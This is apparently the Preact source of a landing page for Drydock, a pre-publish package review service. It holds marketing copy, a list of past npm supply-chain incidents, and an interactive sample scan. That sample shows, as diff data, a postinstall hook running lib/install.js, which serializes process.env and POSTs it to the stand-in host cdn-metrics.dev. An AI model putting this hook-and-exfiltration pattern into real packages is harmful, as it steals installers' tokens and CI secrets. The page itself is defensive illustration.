import type { ComponentChildren } from "preact";
import { useSignal, useComputed, type Signal } from "@preact/signals";
import { Show } from "@preact/signals/utils";
import { homePageSeo, PageSeo, StructuredData } from "../../lib/seo";
import { AikidoPartnerStrip } from "../../components/AikidoPartner";
import { Badge, type BadgeTone } from "../../components/Badge";
import { LinkButton } from "../../components/Button";
import { Card } from "../../components/Card";
import { cn } from "../../components/cn";
import { PageShell } from "../../components/PageShell";
import { SeverityBar } from "../../components/SeverityBar";
import { StatusStrip, StatusStripItem } from "../../components/StatusStrip";
import { Eyebrow, MonoDetail, SectionLabel } from "../../components/Typography";
import { MarketingHeaderActions } from "../MarketingHeaderActions";
import { useAuthedSession } from "../useAuthedSession";

export default function LandingPage() {
  const authed = useAuthedSession();

  return (
    <PageShell
      class="gap-12"
      headerActions={<MarketingHeaderActions authed={authed} />}
      feedbackPosition="end"
    >
      <PageSeo metadata={homePageSeo} />
      <StructuredData />
      <section class="py-8 md:py-12 border-t border-border flex flex-col gap-5">
        <Eyebrow tone="accent">Package review before publish</Eyebrow>
        <h1 class="text-4xl md:text-5xl font-semibold tracking-[-0.03em] leading-[1.05] max-w-[760px] m-0">
          Review the package that will ship.
        </h1>
        <p class="text-[17px] text-ink-muted max-w-[620px] leading-[1.6] m-0">
          Between your last code review and the public registry sit build scripts, bundler output,
          and CI credentials. Drydock holds the release while it is still private, diffs the exact
          artifact against the last published version, and pins every finding to a changed line. You
          make the final call.
        </p>
        <MonoDetail
          parts={[
            "npm stage publish",
            "pypi / npm / vs code workflow gates",
            "no publish credential",
          ]}
        />
        <div class="flex gap-3 mt-2">
          <Show
            when={authed}
            fallback={
              <>
                <LinkButton href="/register">Create account</LinkButton>
                <LinkButton href="/login" variant="secondary">
                  Sign in
                </LinkButton>
              </>
            }
          >
            <LinkButton href="/dashboard">Open dashboard</LinkButton>
          </Show>
        </div>
      </section>

      <ScanPreview />

      <AikidoPartnerStrip />

      <section aria-label="Why review a publish" class="flex flex-col gap-4">
        <SectionLabel as="p">Why review a publish</SectionLabel>
        <h2 class="text-2xl font-semibold tracking-[-0.015em] m-0 max-w-[680px]">
          The attacks that matter ship in the artifact.
        </h2>
        <p class="m-0 text-[14px] text-ink-muted leading-[1.65] max-w-[680px]">
          A pull request review checks the source tree. The registry serves something else: a built
          artifact that can carry install hooks, minified bundles, and files that never lived in
          git, published with a credential that may not belong to the person you think. Once a
          version is live it is immutable and installed within minutes. The last useful checkpoint
          sits between the finished artifact and the registry — and that is the one almost nobody
          looks at.
        </p>
        <IncidentLog />
      </section>

      <section aria-label="How it works" class="flex flex-col gap-5">
        <SectionLabel as="h2">How it works</SectionLabel>
        <HowSteps
          items={[
            {
              title: "Hold the release candidate",
              body: (
                <>
                  A maintainer stages an npm publish, or a GitHub Environment gate pauses the
                  publish job after CI uploads built artifacts. The candidate stays private while
                  Drydock can inspect it.
                </>
              ),
            },
            {
              title: "Review the artifact, not the branch",
              body: (
                <>
                  Drydock compares the candidate with the last published version, flags risky deltas
                  like install scripts, process execution, network access, credential reads, and new
                  binaries, then anchors each finding to the diff. Package contents are never
                  executed.
                </>
              ),
            },
            {
              title: "Let a maintainer decide",
              body: (
                <>
                  Approve the npm publish yourself with 2FA, or approve or reject the gated GitHub
                  job from the workbench. Drydock gives you the review; it never publishes and never
                  holds your publish credential.
                </>
              ),
            },
          ]}
        />
      </section>

      <section aria-label="How Drydock hooks in" class="flex flex-col gap-4">
        <SectionLabel as="h2">How it hooks in</SectionLabel>
        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
          <RegistryCard title="npm stage publish">
            A maintainer runs <code class="font-mono text-[12px] text-ink">npm stage publish</code>{" "}
            and the registry parks a private candidate. Drydock reviews that tarball and pins risk
            signals to the diff before the maintainer completes npm's 2FA confirmation.
          </RegistryCard>
          <RegistryCard title="Workflow gating: PyPI, npm & VS Code" badge="Preview">
            For PyPI, VS Code extensions, or npm workflows that do not stage, a GitHub Environment
            pauses the publish job after CI uploads the release artifact. Drydock reviews the
            upload, the maintainer approves or rejects, and, if approved, the job continues with its
            own credential.
          </RegistryCard>
        </div>
        <LinkButton href="/docs" variant="ghost" size="sm" class="self-start">
          Read the docs →
        </LinkButton>
      </section>

      <section aria-label="Safeguards" class="flex flex-col gap-4">
        <SectionLabel as="h2">Safeguards</SectionLabel>
        <StatusStrip>
          <StatusStripItem label="credentials" status="scoped" tone="ok">
            Scoped tokens only fetch release evidence. Publish credentials stay in npm or GitHub
            Actions, not in Drydock.
          </StatusStripItem>
          <StatusStripItem label="retention" status="redacted" tone="ok">
            Reports keep redacted review evidence instead of raw release archives.
          </StatusStripItem>
          <StatusStripItem label="approval" status="human" tone="neutral">
            Maintainers make the release decision: npm 2FA for a stage publish or the CI gate for
            workflow releases.
          </StatusStripItem>
        </StatusStrip>
      </section>

      <section aria-label="Get started" class="flex flex-col gap-4">
        <SectionLabel as="p">Get started</SectionLabel>
        <h2 class="text-[32px] font-semibold tracking-[-0.02em] leading-[1.15] m-0 max-w-[680px]">
          Put your next release in the dock.
        </h2>
        <p class="m-0 text-[14px] text-ink-muted leading-[1.65] max-w-[620px]">
          Stage an npm publish or add a workflow gate to your release job. Setup takes minutes, and
          from then on every version gets a second pair of eyes before it can ship.
        </p>
        <div class="flex gap-3 mt-1">
          <Show
            when={authed}
            fallback={
              <>
                <LinkButton href="/register">Create account</LinkButton>
                <LinkButton href="/docs" variant="secondary">
                  Read the docs
                </LinkButton>
              </>
            }
          >
            <LinkButton href="/dashboard">Open dashboard</LinkButton>
          </Show>
        </div>
        <MonoDetail parts={["read-only tokens", "you keep the final approval"]} />
      </section>
    </PageShell>
  );
}

function HowSteps({ items }: { items: Array<{ title: string; body: ComponentChildren }> }) {
  return (
    <ol class="list-none p-0 m-0 flex flex-col">
      {items.map((item, index) => (
        <li key={index} class="grid grid-cols-[2rem_minmax(0,1fr)] gap-x-3">
          <div class="flex flex-col items-center">
            <span class="font-mono text-[11px] font-medium text-ink-subtle tabular-nums leading-none pt-[3px]">
              {String(index + 1).padStart(2, "0")}
            </span>
            {index < items.length - 1 ? (
              <span class="w-px flex-1 bg-border mt-2" aria-hidden />
            ) : null}
          </div>
          <div
            class={`flex flex-col gap-1.5 min-w-0 max-w-[680px] ${
              index < items.length - 1 ? "pb-6" : ""
            }`}
          >
            <h3 class="text-base font-medium tracking-[-0.005em] m-0">{item.title}</h3>
            <p class="m-0 text-[13px] text-ink-muted leading-[1.6]">{item.body}</p>
          </div>
        </li>
      ))}
    </ol>
  );
}

function RegistryCard({
  title,
  badge,
  children,
}: {
  title: string;
  badge?: string;
  children: ComponentChildren;
}) {
  return (
    <Card as="article" class="p-5 flex flex-col gap-2">
      <div class="flex flex-wrap items-center gap-2">
        <h2 class="text-base font-medium tracking-[-0.005em] m-0">{title}</h2>
        {badge ? <Badge tone="info">{badge}</Badge> : null}
      </div>
      <p class="text-[13px] text-ink-muted leading-[1.55] m-0">{children}</p>
    </Card>
  );
}

/* ---------------------------------------------------------------- *
 * Incident log — the publish-time attacks the artifact gap enabled *
 * ---------------------------------------------------------------- */

const INCIDENTS: Array<{ name: string; year: string; vector: string; shipped: string }> = [
  {
    name: "event-stream",
    year: "2018",
    vector: "publish rights handed over",
    shipped:
      "A volunteer co-maintainer published a wallet-drainer aimed at Copay. The payload existed only in the npm tarball — the GitHub repository never showed it.",
  },
  {
    name: "ua-parser-js",
    year: "2021",
    vector: "hijacked npm account",
    shipped:
      "Three malicious versions carried a cryptominer and a credential stealer. The repository was untouched; only the published artifacts were compromised.",
  },
  {
    name: "node-ipc",
    year: "2022",
    vector: "maintainer's own publish",
    shipped:
      "A legitimate credential shipped a payload that overwrote files based on the installer's IP address. Nothing about the account looked wrong.",
  },
  {
    name: "chalk & debug",
    year: "2025",
    vector: "phished maintainer",
    shipped:
      "One phishing email compromised 18 packages with about two billion combined weekly downloads. The crypto-stealing versions were live for hours before anyone diffed them.",
  },
];

function IncidentLog() {
  return (
    <Card as="div" padding="none" class="overflow-hidden">
      <ul class="list-none m-0 p-0">
        {INCIDENTS.map((incident) => (
          <li
            key={incident.name}
            class="border-b border-border grid grid-cols-1 md:grid-cols-[220px_minmax(0,1fr)] gap-x-6 gap-y-1.5 px-5 py-4"
          >
            <div class="flex flex-col gap-1 min-w-0">
              <span class="font-mono text-[13px] text-ink">{incident.name}</span>
              <MonoDetail parts={[incident.year, incident.vector]} />
            </div>
            <p class="m-0 text-[13px] text-ink-muted leading-[1.55]">{incident.shipped}</p>
          </li>
        ))}
      </ul>
      <p class="m-0 px-5 py-4 text-[13px] leading-[1.55] text-ink">
        None of these appeared in a pull request. Every one shipped through a publish nobody
        reviewed.
      </p>
    </Card>
  );
}

/* ------------------------------------------------------------------ *
 * Interactive review preview — a condensed scan report. The tree is  *
 * clickable; each file swaps in its own diff and pinned finding.     *
 * ------------------------------------------------------------------ */

type PreviewDiffLine = {
  tone: "added" | "removed" | "unchanged";
  before: number | null;
  after: number | null;
  text: string;
};

type PreviewFinding = {
  severity: "critical" | "medium";
  caption: string;
  body: ComponentChildren;
};

type PreviewFile = {
  path: string;
  status: "added" | "modified";
  lines: PreviewDiffLine[];
  finding?: PreviewFinding;
};

const PREVIEW_FILES = {
  "package.json": {
    path: "package.json",
    status: "modified",
    lines: [
      { tone: "unchanged", before: 3, after: 3, text: '  "version": "4.3.0",' },
      { tone: "unchanged", before: 4, after: 4, text: '  "main": "lib/index.js",' },
      { tone: "unchanged", before: 5, after: 5, text: '  "scripts": {' },
      { tone: "unchanged", before: 6, after: 6, text: '    "build": "tsc -p .",' },
      {
        tone: "added",
        before: null,
        after: 7,
        text: '    "postinstall": "node lib/install.js",',
      },
      { tone: "unchanged", before: 7, after: 8, text: '    "test": "vitest"' },
      { tone: "unchanged", before: 8, after: 9, text: "  }," },
    ],
    finding: {
      severity: "critical",
      caption: "lifecycle script added · line 7",
      body: (
        <>
          <code class="font-mono text-[12px] text-ink-muted">postinstall</code> now executes during
          every <code class="font-mono text-[12px] text-ink-muted">npm install</code>, invoking{" "}
          <code class="font-mono text-[12px] text-ink-muted">lib/install.js</code>, a file new in
          this release. Select it in the tree to see why this release is blocked.
        </>
      ),
    },
  },
  "lib/install.js": {
    path: "lib/install.js",
    status: "added",
    lines: [
      { tone: "added", before: null, after: 1, text: 'const os = require("node:os");' },
      { tone: "added", before: null, after: 2, text: "const payload = Buffer.from(" },
      {
        tone: "added",
        before: null,
        after: 3,
        text: "  JSON.stringify({ host: os.hostname(), env: process.env }),",
      },
      { tone: "added", before: null, after: 4, text: ').toString("base64");' },
      {
        tone: "added",
        before: null,
        after: 5,
        text: 'fetch("https://cdn-metrics.dev/i", { method: "POST", body: payload });',
      },
    ],
    finding: {
      severity: "critical",
      caption: "environment sent to network sink · line 5",
      body: (
        <>
          The full environment — npm tokens, CI secrets — is serialized and posted to{" "}
          <code class="font-mono text-[12px] text-ink-muted">cdn-metrics.dev</code>, a host this
          package has never contacted. Combined with the new{" "}
          <code class="font-mono text-[12px] text-ink-muted">postinstall</code> hook, it runs on
          every install.
        </>
      ),
    },
  },
  "lib/api.js": {
    path: "lib/api.js",
    status: "modified",
    lines: [
      { tone: "unchanged", before: 21, after: 21, text: "export async function getUser(id) {" },
      {
        tone: "unchanged",
        before: 22,
        after: 22,
        text: "  const res = await fetch(`${API_BASE}/users/${id}`);",
      },
      { tone: "added", before: null, after: 23, text: "  await reportUsage(id);" },
      { tone: "unchanged", before: 23, after: 24, text: "  return res.json();" },
      { tone: "unchanged", before: 24, after: 25, text: "}" },
      { tone: "added", before: null, after: 26, text: "" },
      { tone: "added", before: null, after: 27, text: "async function reportUsage(id) {" },
      {
        tone: "added",
        before: null,
        after: 28,
        text: "  await fetch(`https://api.acme-usage.dev/v1/e?u=${id}`);",
      },
      { tone: "added", before: null, after: 29, text: "}" },
    ],
    finding: {
      severity: "medium",
      caption: "new request target · line 28",
      body: (
        <>
          <code class="font-mono text-[12px] text-ink-muted">api.acme-usage.dev</code> is an
          outbound host the previous version never contacted. Not malicious on its face — the kind
          of change worth thirty seconds before it reaches every install.
        </>
      ),
    },
  },
  "lib/index.js": {
    path: "lib/index.js",
    status: "modified",
    lines: [
      { tone: "unchanged", before: 1, after: 1, text: 'export { getUser } from "./api.js";' },
      { tone: "removed", before: 2, after: null, text: 'export const VERSION = "4.2.0";' },
      { tone: "added", before: null, after: 2, text: 'export const VERSION = "4.3.0";' },
    ],
  },
} satisfies Record<string, PreviewFile>;

type PreviewFileKey = keyof typeof PREVIEW_FILES;

function ScanPreview() {
  const selected = useSignal<PreviewFileKey>("package.json");

  return (
    <section class="flex flex-col gap-3" aria-label="Sample review">
      <SectionLabel as="h2">What a review looks like</SectionLabel>
      <p class="m-0 text-[13px] text-ink-muted leading-[1.55]">
        A condensed report. Select a file in the release tree to walk the diff.
      </p>
      <Card class="p-0 overflow-hidden">
        <header class="px-5 pt-5 pb-4 border-b border-border flex flex-col gap-3">
          <div class="flex flex-wrap items-baseline justify-between gap-x-4 gap-y-1">
            <h3 class="m-0 text-lg font-semibold tracking-[-0.01em]">@acme/cli</h3>
            <span class="font-mono text-[11px] text-ink-subtle">scan_01HXY5K9PNQE3</span>
          </div>
          <MonoDetail
            parts={[
              <span key="v">4.2.0 → 4.3.0</span>,
              <span key="files">17 files</span>,
              <span key="changed">4 changed</span>,
              <span key="status">complete</span>,
            ]}
          />
          <div class="flex flex-wrap items-center gap-2">
            <Badge tone="critical">block manual approval</Badge>
            <Badge tone="critical">release critical</Badge>
            <Badge tone="medium">3 findings</Badge>
          </div>
          <SeverityBar counts={{ critical: 2, medium: 1 }} class="max-w-[420px]" />
        </header>

        <div class="grid grid-cols-1 md:grid-cols-[220px_minmax(0,1fr)] divide-y md:divide-y-0 md:divide-x divide-border">
          <aside class="p-4 flex flex-col gap-2 bg-bg/40">
            <span class="font-mono text-[10px] uppercase tracking-[0.1em] text-ink-subtle">
              Release tree
            </span>
            <ul class="list-none p-0 m-0 flex flex-col gap-0.5 font-mono text-[12px]">
              <TreeRow depth={0} folder open name="lib" tone="mixed" />
              <TreeFileRow
                depth={1}
                fileKey="lib/install.js"
                name="install.js"
                tone="added"
                findingTone="critical"
                findings={1}
                selected={selected}
              />
              <TreeFileRow
                depth={1}
                fileKey="lib/api.js"
                name="api.js"
                tone="modified"
                findingTone="medium"
                findings={1}
                selected={selected}
              />
              <TreeFileRow
                depth={1}
                fileKey="lib/index.js"
                name="index.js"
                tone="modified"
                selected={selected}
              />
              <TreeFileRow
                depth={0}
                fileKey="package.json"
                name="package.json"
                tone="modified"
                findingTone="critical"
                findings={1}
                selected={selected}
              />
              <TreeRow depth={0} name="README.md" tone="unchanged" />
              <TreeRow depth={0} name="LICENSE" tone="unchanged" />
            </ul>
          </aside>

          <PreviewPane selected={selected} />
        </div>
      </Card>
    </section>
  );
}

// The whole pane swaps with the selection, so the `.value` read here is the
// subscription boundary on purpose: only this component rerenders.
function PreviewPane({ selected }: { selected: Signal<PreviewFileKey> }) {
  const file: PreviewFile = PREVIEW_FILES[selected.value];
  return (
    <div class="flex flex-col min-w-0">
      <div class="px-4 py-2 bg-surface-2 flex flex-wrap items-center justify-between gap-2 border-b border-border">
        <div class="flex items-center gap-2 min-w-0">
          <Badge tone={file.status}>{file.status}</Badge>
          <code class="font-mono text-xs text-ink-muted truncate">{file.path}</code>
        </div>
        <span class="font-mono text-[10px] uppercase tracking-[0.1em] text-ink-subtle">
          4.2.0 → 4.3.0
        </span>
      </div>

      <div class="overflow-x-auto">
        <table class="w-full border-collapse font-mono text-[12px] leading-[1.55]">
          <tbody>
            {file.lines.map((line, index) => (
              <DiffLine key={index} {...line} />
            ))}
          </tbody>
        </table>
      </div>

      {file.finding ? (
        <FindingAnnotation severity={file.finding.severity} caption={file.finding.caption}>
          {file.finding.body}
        </FindingAnnotation>
      ) : (
        <p class="m-0 border-t border-border px-4 py-3 text-[13px] leading-[1.55] text-ink-muted">
          No findings — most of a release reads like this file.
        </p>
      )}
    </div>
  );
}

const treeToneClass: Record<string, string> = {
  added: "text-ok-text",
  removed: "text-danger-text",
  modified: "text-warn-text",
  mixed: "text-accent",
  unchanged: "text-ink-muted",
};

function TreeRow({
  depth,
  name,
  tone,
  folder,
  open,
}: {
  depth: number;
  name: string;
  tone: "added" | "removed" | "modified" | "unchanged" | "mixed";
  folder?: boolean;
  open?: boolean;
}) {
  return (
    <li class={cn("flex items-center gap-2 py-0.5 pr-1.5 pl-1 rounded", treeToneClass[tone])}>
      <TreeRowIndent depth={depth} folder={folder} open={open} />
      <span class="flex-1 truncate">
        {name}
        {folder ? "/" : ""}
      </span>
    </li>
  );
}

function TreeFileRow({
  depth,
  fileKey,
  name,
  tone,
  findings,
  findingTone,
  selected,
}: {
  depth: number;
  fileKey: PreviewFileKey;
  name: string;
  tone: "added" | "modified";
  findings?: number;
  findingTone?: BadgeTone;
  selected: Signal<PreviewFileKey>;
}) {
  const rowClass = useComputed(() =>
    cn(
      "w-full text-left font-mono text-[12px] flex items-center gap-2 py-0.5 pr-1.5 pl-1 rounded cursor-pointer transition-colors duration-150 ease-out",
      selected.value === fileKey
        ? "bg-surface-2 text-ink"
        : cn(treeToneClass[tone], "hover:bg-surface-2/60"),
    ),
  );
  const current = useComputed(() => (selected.value === fileKey ? "true" : undefined));
  return (
    <li class="flex">
      <button
        type="button"
        class={rowClass}
        aria-current={current}
        onClick={() => {
          selected.value = fileKey;
        }}
      >
        <TreeRowIndent depth={depth} />
        <span class="flex-1 truncate">{name}</span>
        {findings ? (
          <span
            class="shrink-0"
            title={`${findings} ${findings === 1 ? "finding" : "findings"}`}
            aria-label={`${findings} ${findings === 1 ? "finding" : "findings"}`}
          >
            <Badge tone={findingTone ?? "neutral"}>{findings}</Badge>
          </span>
        ) : null}
      </button>
    </li>
  );
}

function TreeRowIndent({
  depth,
  folder,
  open,
}: {
  depth: number;
  folder?: boolean;
  open?: boolean;
}) {
  return (
    <>
      {Array.from({ length: depth }, (_, index) => (
        <span key={index} class="w-4 shrink-0" aria-hidden />
      ))}
      {folder ? (
        <span aria-hidden class="text-[10px] text-ink-subtle">
          {open ? "▾" : "▸"}
        </span>
      ) : (
        <span class="w-[10px] shrink-0" aria-hidden />
      )}
    </>
  );
}

function DiffLine({ tone, before, after, text }: PreviewDiffLine) {
  const bg = tone === "added" ? "bg-ok-soft" : tone === "removed" ? "bg-danger-soft" : "";
  const sign = tone === "added" ? "+" : tone === "removed" ? "-" : " ";
  return (
    <tr class={bg}>
      <td class="px-2 py-[2px] text-ink-subtle select-none w-[44px] text-right border-r border-border align-top">
        {before ?? ""}
      </td>
      <td class="px-2 py-[2px] text-ink-subtle select-none w-[44px] text-right border-r border-border align-top">
        {after ?? ""}
      </td>
      <td class="px-2 py-[2px] select-none w-[20px] text-ink-subtle align-top">{sign}</td>
      <td class="px-2 py-[2px] whitespace-pre-wrap break-words align-top">{text}</td>
    </tr>
  );
}

function FindingAnnotation({
  severity,
  caption,
  children,
}: {
  severity: "critical" | "medium";
  caption: string;
  children: ComponentChildren;
}) {
  const toneClass =
    severity === "critical" ? "bg-danger-soft/60 border-l-danger" : "bg-warn-soft/60 border-l-warn";
  return (
    <div class={cn("border-t border-border border-l-2 px-4 py-3 flex flex-col gap-1.5", toneClass)}>
      <div class="flex items-center gap-2 flex-wrap">
        <Badge tone={severity}>{severity}</Badge>
        <span class="font-mono text-[10px] uppercase tracking-[0.1em] text-ink-subtle">
          {caption}
        </span>
      </div>
      <p class="m-0 text-[13px] leading-[1.55] text-ink">{children}</p>
    </div>
  );
}
